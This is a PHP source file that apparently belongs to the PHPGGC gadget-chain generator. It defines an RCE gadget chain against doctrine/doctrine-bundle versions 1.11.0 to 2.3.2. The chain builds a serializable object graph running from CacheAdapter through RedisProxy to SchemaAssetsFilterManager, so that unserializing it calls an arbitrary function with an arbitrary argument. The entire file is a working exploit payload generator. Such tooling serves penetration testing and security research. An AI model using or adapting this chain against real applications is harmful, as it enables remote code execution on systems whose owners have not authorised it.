<?php

namespace GadgetChain\Doctrine;

use Doctrine\Common\Cache\Psr6\CacheAdapter;
use Symfony\Component\Cache\Traits\RedisProxy;
use Doctrine\Bundle\DoctrineBundle\Dbal\SchemaAssetsFilterManager;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.11.0 <= 2.3.2';
    public static $vector = '__destruct';
    public static $author = 'Remsio';
    public static $information = 
        'Based on package doctrine/doctrine-bundle, the Symfony bundle for
        doctrine. This chain exploits : $schemaAssetFilter($assetName) from
        SchemaAssetsFilterManager __invoke function.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        $obj = new CacheAdapter();
        $obj->loader = 1;
        $redisProxy = new RedisProxy($parameter);
        $redisProxy->initializer = new SchemaAssetsFilterManager($function);
        $obj->deferredItems = [$redisProxy];
        return $obj;
    }
}
